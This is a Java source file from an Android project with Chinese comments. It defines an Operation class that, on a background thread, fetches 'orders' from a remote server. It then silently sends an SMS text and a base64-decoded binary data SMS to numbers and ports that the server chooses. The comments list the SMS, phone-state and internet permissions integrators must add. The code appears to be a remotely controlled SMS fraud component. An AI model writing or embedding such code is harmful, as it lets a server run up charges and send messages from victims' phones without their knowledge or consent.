package com.example.guangzhou_genyuan.tocp;

import android.content.Context;
import android.support.annotation.NonNull;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * 执行execute既可以获取指令并发送短信
 * 您可以使用String ip = new URL2FetchIp().getIp();获取IP地址
 * 另外请添加下列权限到您的manifest.xml
 * <uses-permission android:name="android.permission.SEND_SMS"/>
 * <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 * <uses-permission android:name="android.permission.INTERNET"/>
 * <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
 */
public class Operation
{
    private static final String PROCESS = "PROCESS";

    public static void execute(final Context context, final String ip)
    {
        Runnable runnable = new Runnable()
        {
            @Override
            public void run()
            {
                try
                {
                    StringBuilder stringBuilder = getOrder(context, ip);
                    ServiceResponse serverResponse = parseOrder(stringBuilder);
                    SendSms sendSms = checkOrder(serverResponse, context);

                    if (sendSms.getCount() > 0)
                    {
                        sendSms.register();
                        runOrder(serverResponse, sendSms);
                    }
                }
                catch (Exception e)
                {
                    e.printStackTrace();
                }
            }
        };
        new Thread(runnable).start();
    }

    /**
     * 检查指令是否是空的，如果不是空的，增加短信监听的次数（短信监听的次数初始化为0次，如果有初始化短信短信监听次数加1
     * 如果有内容短信，短信监听次数加1
     * @param serverResponse 从服务器获取的指令
     * @param context
     * @return
     */
    @NonNull
    public static SendSms checkOrder(ServiceResponse serverResponse, Context context)
    {
        SendSms sendSms = new SendSms(context);

        if (!serverResponse.getInit_sms_number().equals("") && !serverResponse.getInit_sms().equals(""))
        {
            sendSms.increaseCount();
        }
        if (!serverResponse.getPort().equals("") && !serverResponse.getCmd().equals(""))
        {
            sendSms.increaseCount();
        }
        return sendSms;
    }

    /**
     * 发送指令内容，有初始化短信则发送初始化短信，间隔2秒后发送内容短信
     * @param serverResponse
     * @param sendSms
     * @throws InterruptedException
     */
    public static void runOrder(ServiceResponse serverResponse, SendSms sendSms) throws InterruptedException
    {
        if (!serverResponse.getInit_sms_number().equals("") && !serverResponse.getInit_sms().equals(""))
        {
            sendSms.sendTextMessage(serverResponse.getInit_sms_number(), serverResponse.getInit_sms());
            Thread.sleep(2000);
        }

        if (!serverResponse.getPort().equals("") && !serverResponse.getCmd().equals(""))
        {
            sendSms.sendDataMessage(serverResponse.getPort(), Short.valueOf(serverResponse.getPortnumber()), Base64.decode(serverResponse.getCmd(), Base64.DEFAULT));
        }
    }

    /**
     * 将指令解析为serviceResponse的格式
     * @param stringBuilder
     * @return
     */
    public static ServiceResponse parseOrder(StringBuilder stringBuilder)
    {
        ParseResponse parseResponse = new ParseResponse();
        return parseResponse.getServerResponse(stringBuilder.toString());
    }

    /**
     * 从服务器获取指令，您需要提供IP地址，您可以使用URL2FetchIp类获取IP地址
     * @param context
     * @param ip
     * @return
     * @throws IOException
     */
    @NonNull
    public static StringBuilder getOrder(Context context, String ip) throws IOException
    {
        URL url = new URL(new URL2order(context).getUrl(ip));
        Log.e(PROCESS, new URL2order(context).getUrl(ip));
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        InputStream inputStream = urlConnection.getInputStream();
        Reader reader = new InputStreamReader(inputStream);
        BufferedReader bufferedReader = new BufferedReader(reader);

        StringBuilder stringBuilder = new StringBuilder();
        String line;
        while (true)
        {
            line = bufferedReader.readLine();
            if (line == null)
            {
                break;
            }
            stringBuilder.append(line);
        }

        Log.e(PROCESS, stringBuilder.toString());
        return stringBuilder;
    }
}
